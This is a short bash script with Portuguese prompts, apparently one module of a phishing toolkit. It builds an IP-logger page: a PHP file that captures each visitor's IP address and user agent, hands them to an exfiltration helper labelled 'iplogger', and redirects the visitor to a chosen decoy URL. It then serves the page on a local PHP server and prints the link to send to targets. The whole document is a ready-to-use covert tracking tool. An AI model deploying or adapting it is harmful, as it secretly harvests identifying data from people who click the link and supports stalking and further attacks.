#!/bin/bash
R="$(cd "$(dirname "$0")/.." && pwd)"
SRV="$R/.server/www"
read -rp "URL de redirecionamento (ex: https://google.com): " u
cat > "$SRV/ip.php" << EOP
<?php
\$ip=\$_SERVER['REMOTE_ADDR']??'?'; \$ua=\$_SERVER['HTTP_USER_AGENT']??'?'; \$r='$u';
require_once __DIR__.'/core/exfil.php';
lph_exfil('iplogger',['ip'=>\$ip,'ua'=>\$ua]);
header("Location: \$r");
EOP
cp -r "$R/core" "$SRV/core"
read -rp "Porta [8080]: " p; p="${p:-8080}"
php -S 127.0.0.1:$p -t "$SRV" >/dev/null 2>&1 &
echo -e "\033[1;37m[+] Link: http://127.0.0.1:$p/ip.php\033[0m"
